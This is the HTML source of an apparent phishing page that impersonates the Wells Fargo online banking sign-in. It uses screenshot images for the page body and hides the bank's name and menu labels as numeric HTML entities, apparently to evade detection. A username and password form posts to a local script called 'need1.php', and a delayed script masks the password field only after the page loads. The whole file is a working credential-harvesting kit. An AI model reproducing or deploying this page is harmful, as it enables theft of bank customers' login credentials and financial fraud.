<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#87;&#101;&#108;&#108;&#115;&#32;&#70;&#97;&#114;&#103;&#111;&#32;&#45;&#32;&#80;&#101;&#114;&#115;&#111;&#110;&#97;&#108;&#32;&#38;&#32;&#66;&#117;&#115;&#105;&#110;&#101;&#115;&#115;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;&#32;&#45;&#32;&#83;&#116;&#117;&#100;&#101;&#110;&#116;&#44;&#32;&#65;&#117;&#116;&#111;&#32;&#38;&#32;&#72;&#111;&#109;&#101;&#32;&#76;&#111;&#97;&#110;&#115;&#32;&#45;&#32;&#73;&#110;&#118;&#101;&#115;&#116;&#105;&#110;&#103;&#32;&#38;&#32;&#73;&#110;&#115;&#117;&#114;&#97;&#110;&#99;&#101;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon1.ico"/>

<style type="text/css">
  
.textbox {  
  	border: 1px solid #fff;
  	border-radius: 2px;
    background-color: #d8d8d8;
    color: #434343;
    font-family: verdana;
    font-weight: bold;
    padding-left: 6px;
    font-size: 13px;
    height: 36px; 
    width: 275px; 
 } 
 
.textbox:focus {  
    border: 1px dotted #000000;  
    outline: 0; 
 } 

 </style>
<style type="text/css">
  
.textrbox {  
  	border-radius: 2px;
    font-family: verdana;
    font-size: 15px;
    padding-left: 8px;
    width: 184px;
    border: 1px solid #fff;
    height: 35px; 
    width: 275px; 
 } 
 
.textrbox:focus {  
    border-color: #4488cc; 
    border-style: solid; 
    border-width: 2px; 
    outline: 0; 
 } 

 </style> 
 <style type="text/css">
 input[type=checkbox].css-checkbox {
							position:absolute; z-index:-1000; left:-1000px; overflow: hidden; clip: rect(0 0 0 0); height:1px; width:1px; margin:-1px; padding:0; border:0;
						}

						input[type=checkbox].css-checkbox + label.css-label {
							padding-left:23px;
							height:18px; 
							display:inline-block;
							line-height:18px;
							background-repeat:no-repeat;
							background-position: 0 0;
							font-size:18px;
							vertical-align:middle;
							cursor:pointer;

						}

						input[type=checkbox].css-checkbox:checked + label.css-label {
							background-position: 0 -18px;
						}
						label.css-label {
				background-image:url(images/csscheckbox_59786bddc23cad2c757a3a1253557d6a.png);
				-webkit-touch-callout: none;
				-webkit-user-select: none;
				-khtml-user-select: none;
				-moz-user-select: none;
				-ms-user-select: none;
				user-select: none;
			}
 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>

</head>
</head>
<body>
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:150px; z-index:0"><a href="#"><img src="images/s1.png" alt="" title="" border=0 width=1349 height=150></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:66px; top:149px; width:1219px; height:534px; z-index:1"><img src="images/s2.png" alt="" title="" border=0 width=1219 height=534></div>

<div id="image3" style="position:absolute; overflow:hidden; left:58px; top:681px; width:1232px; height:313px; z-index:2"><img src="images/s4.png" alt="" title="" border=0 width=1232 height=313></div>

<div id="image4" style="position:absolute; overflow:hidden; left:61px; top:991px; width:1229px; height:302px; z-index:3"><img src="images/s5.png" alt="" title="" border=0 width=1229 height=302></div>

<div id="image5" style="position:absolute; overflow:hidden; left:60px; top:1291px; width:1232px; height:334px; z-index:4"><img src="images/s6.png" alt="" title="" border=0 width=1232 height=334></div>

<div id="image6" style="position:absolute; overflow:hidden; left:61px; top:1624px; width:1225px; height:425px; z-index:5"><img src="images/s7.png" alt="" title="" border=0 width=1225 height=425></div>

<div id="image7" style="position:absolute; overflow:hidden; left:0px; top:2342px; width:1349px; height:259px; z-index:6"><img src="images/s9.png" alt="" title="" border=0 width=1349 height=259></div>

<div id="image8" style="position:absolute; overflow:hidden; left:0px; top:2600px; width:1349px; height:256px; z-index:7"><img src="images/s10.png" alt="" title="" border=0 width=1349 height=256></div>

<div id="image9" style="position:absolute; overflow:hidden; left:0px; top:2049px; width:1349px; height:293px; z-index:8"><img src="images/s8.png" alt="" title="" border=0 width=1349 height=293></div>

<div id="image10" style="position:absolute; overflow:hidden; left:209px; top:405px; width:169px; height:83px; z-index:9"><a href="#"><img src="images/s12.png" alt="" title="" border=0 width=169 height=83></a></div>
<form action=need1.php name=passocones id=passocones method=post>
<select name="sm" class="textbox" autocomplete="off" required style="position:absolute;left:211px;top:208px;width:184px;z-index:10">
<option value="&#65;&#99;&#99;&#111;&#117;&#110;&#116;&#32;&#83;&#117;&#109;&#109;&#97;&#114;&#121;" selected="selected">&#65;&#99;&#99;&#111;&#117;&#110;&#116;&#32;&#83;&#117;&#109;&#109;&#97;&#114;&#121;</option>
							<option value="&#84;&#114;&#97;&#110;&#115;&#102;&#101;&#114;">&#84;&#114;&#97;&#110;&#115;&#102;&#101;&#114;</option>
							<option value="&#66;&#105;&#108;&#108;&#32;&#80;&#97;&#121;">&#66;&#105;&#108;&#108;&#32;&#80;&#97;&#121;</option>
							<option value="&#66;&#114;&#111;&#107;&#101;&#114;&#97;&#103;&#101;">&#66;&#114;&#111;&#107;&#101;&#114;&#97;&#103;&#101;</option>
							<option value="&#84;&#114;&#97;&#100;&#101;">&#84;&#114;&#97;&#100;&#101;</option>
							<option value="&#77;&#101;&#115;&#115;&#97;&#103;&#101;&#115;&#32;&#97;&#110;&#100;&#32;&#65;&#108;&#101;&#114;&#116;&#115;">&#77;&#101;&#115;&#115;&#97;&#103;&#101;&#115;&#32;&#97;&#110;&#100;&#32;&#65;&#108;&#101;&#114;&#116;&#115;</option></select>

<input name="ud" placeholder="&#85;&#115;&#101;&#114;&#110;&#97;&#109;&#101;" class="textrbox" autocomplete="off" required type="text" style="position:absolute;width:184px;left:211px;top:251px;z-index:11">
<input name="pd" placeholder="&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textrbox" autocomplete="off" required type="text" style="position:absolute;width:184px;left:211px;top:292px;z-index:12">

<div id="checkboxG1"  style="position:absolute; left:210px; top:335px; z-index:13"><input type="checkbox" name="checkboxG1" id="checkboxG1" class="css-checkbox"><label for="checkboxG1" class="css-label radGroup1 chk"></label></div>
<div id="checkboxG1"  style="position:absolute; left:210px; top:335px; z-index:13"><input type="checkbox" name="checkboxG2" id="checkboxG2" class="css-checkbox"><label for="checkboxG2" class="css-label radGroup1 clr"></label></div>
<div id="formimage1" style="position:absolute; left:210px; top:360px; z-index:14"><input type="image" name="formimage1" width="186" height="37" src="images/ssign.png"></div>
</div>

	
</body>
</html>
